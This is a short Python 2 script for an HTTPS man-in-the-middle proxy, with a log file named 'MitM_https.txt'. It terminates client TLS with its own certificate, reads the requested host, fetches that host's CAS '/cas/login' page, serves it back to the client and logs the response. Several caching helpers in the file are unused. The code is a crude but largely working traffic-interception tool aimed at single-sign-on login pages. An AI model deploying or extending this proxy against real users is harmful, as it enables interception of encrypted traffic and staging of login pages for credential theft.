import socket
import threading
import sys
import re
import os
import time
from netaddr import IPNetwork
import base64
import ssl
import httplib


def retrieve_from_cache(response):
    if "304" in response:
        return True
    else:
        return False


def put_cache(client, filename, response):
    print filename
    with open(filename, 'wb') as f:
        f.write(response)
    response_no_cache(client ,response)

def cache_condition(client, filename, response):
    if("no-cache" not in response):
        put_cache(client, filename, response)
    else:
        response_no_cache(client, response)

def check_if_present(filename, req):
    exist = os.path.isfile(filename)
    if(exist):
        file_time = time.ctime(os.path.getmtime(filename))
        print file_time
        ind = req.find('\r\n\r\n')

        add='\r\nIf-Modified-Since: ' + file_time +'\r\n\r\n'
        req = req[:ind]+add
        return req
    if(not exist):
        return req

def response_no_cache(client, response):
    client.sendall(response)

def response_cache(client, filename):
    f = open(filename , 'rb')
    l = f.read(1024)
    while(l):
        client.send(l)
        l = f.read(1024)
    f.close()


class ThreadedServer(object):
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def __del__(self):
        self.sock.close()
        
    def listen(self):
        self.sock.listen(10)
        while True:
            client, address = self.sock.accept()
            client.settimeout(6)
            threading.Thread(target = self.listenToClient,args = (client,address)).start()

    def listenToClient(self, client, address):

        size = 1024
        log = open('MitM_https.txt', "a")
        #RECEIVING REQUEST FROM CLIENT



        # SET VARIABLES
        packet, reply = "<packet>SOME_DATA</packet>", ""

        # WRAP SOCKET
        connstream = ssl.wrap_socket(client, do_handshake_on_connect=True, server_side=True, certfile="server.crt", keyfile="server.key")
        request=""


        request = connstream.read()

        print "REQUEST : "
        temp = request[request.find("Host: ")+6:] 
        host = temp[:temp.find("\r")]
        print host
        conn = httplib.HTTPSConnection(host)
        conn.request("GET", "/cas/login")
        r1 = conn.getresponse()

        
        data = r1.read()
        try:
            connstream.write(data)
        except:
            pass
        

        print data
        log.write(data)

        try:
            connstream.shutdown(socket.SHUT_RDWR)
            connstream.close()
        except:
            pass
        log.close()




if __name__ == "__main__":
    port_num = input("Port? ")
    ThreadedServer('',port_num).listen()
   

